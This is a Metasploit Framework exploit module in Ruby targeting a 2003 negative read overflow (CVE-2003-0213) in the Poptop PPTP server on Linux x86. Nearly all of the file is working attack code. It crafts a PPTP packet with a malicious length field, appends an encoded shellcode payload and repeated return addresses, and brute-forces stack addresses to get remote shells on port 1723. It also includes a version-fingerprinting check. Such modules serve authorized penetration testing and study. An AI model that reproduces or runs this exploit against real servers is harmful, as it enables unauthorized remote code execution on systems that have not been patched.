##
# $Id: poptop_negative_read.rb 11114 2010-11-23 18:12:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Brute

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Poptop Negative Read Overflow\',
			\'Description\'    => %q{
					This is an exploit for the Poptop negative read overflow.  This will
				work against versions prior to 1.1.3-b3 and 1.1.3-20030409, but I
				currently do not have a good way to detect Poptop versions.

				The server will by default only allow 4 concurrent manager processes
				(what we run our code in), so you could have a max of 4 shells at once.

				Using the current method of exploitation, our socket will be closed
				before we have the ability to run code, preventing the use of Findsock.
			},
			\'Author\'         => \'spoonm\',
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 11114 $\',
			\'References\'     =>
				[
					[\'CVE\', \'2003-0213\'],
					[\'OSVDB\', \'3293\'],
					[\'URL\',   \'http://securityfocus.com/archive/1/317995\'],
					[\'URL\',   \'http://www.freewebs.com/blightninjas/\'],
				],
			\'Privileged\'     => true,
			\'Payload\'        =>
				{
					# Payload space is dynamically determined
					\'MinNops\'         => 16,
					\'StackAdjustment\' => -1088,
					\'Compat\'          =>
						{
							\'ConnectionType\' => \'-find\',
						}
				},
			\'SaveRegisters\'  => [ \'esp\' ],
			\'Platform\'       => \'linux\',
			\'Arch\'           => ARCH_X86,
			\'Targets\'        =>
				[
					[\'Linux Bruteforce\',
						{ \'Bruteforce\' =>
							{
								\'Start\'  => { \'Ret\' => 0xbffffa00 },
								\'Stop\'   => { \'Ret\' => 0xbffff000 },
								\'Step\'   => 0
							}
						}
					],
				],
			\'DefaultTarget\'  => 0,
			\'DisclosureDate\' => \'Apr 9 2003\'))

		register_options(
			[
				Opt::RPORT(1723)
			], self.class)

		register_advanced_options(
			[
				OptInt.new(\"PreReturnLength\", [ true, \"Space before we hit the return address.  Affects PayloadSpace.\", 220 ]),
				OptInt.new(\"RetLength\",       [ true, \"Length of returns after payload.\", 32 ]),
				OptInt.new(\"ExtraSpace\",      [ true, \"The exploit builds two protocol frames, the header frame and the control frame. ExtraSpace allows you use this space for the payload instead of the protocol (breaking the protocol, but still triggering the bug). If this value is <= 128, it doesn\'t really disobey the protocol, it just uses the Vendor and Hostname fields for payload data (these should eventually be filled in to look like a real client, ie windows).  I\'ve had successful exploitation with this set to 154, but nothing over 128 is suggested.\", 0 ]),
				OptString.new(\"Hostname\",     [ false, \"PPTP Packet hostname\", \'\' ]),
				OptString.new(\"Vendor\",       [ true, \"PPTP Packet vendor\", \'Microsoft Windows NT\' ]),
			], self.class)
	end

	# Dynamic payload space calculation
	def payload_space(explicit_target = nil)
		datastore[\'PreReturnLength\'].to_i + datastore[\'ExtraSpace\'].to_i
	end

	def build_packet(length)
		[length, 1, 0x1a2b3c4d, 1, 0].pack(\'nnNnn\') +
			[1,0].pack(\'cc\') +
			[0].pack(\'n\') +
			[1,1,0,2600].pack(\'NNnn\') +
			datastore[\'Hostname\'].ljust(64, \"\\x00\") +
			datastore[\'Vendor\'].ljust(64, \"\\x00\")
	end

	def check
		connect
		sock.put(build_packet(156))
		res = sock.get_once

		if res and res =~ /MoretonBay/
			return CheckCode::Detected
		end

		return CheckCode::Safe
	end

	def brute_exploit(addrs)
		connect

		print_status(\"Trying #{\"%.8x\" % addrs[\'Ret\']}...\")

		# Construct the evil length packet
		packet =
			build_packet(1) +
			payload.encoded +
			([addrs[\'Ret\']].pack(\'V\') * (datastore[\'RetLength\'] / 4))

		sock.put(packet)

		handler
		disconnect
	end

end
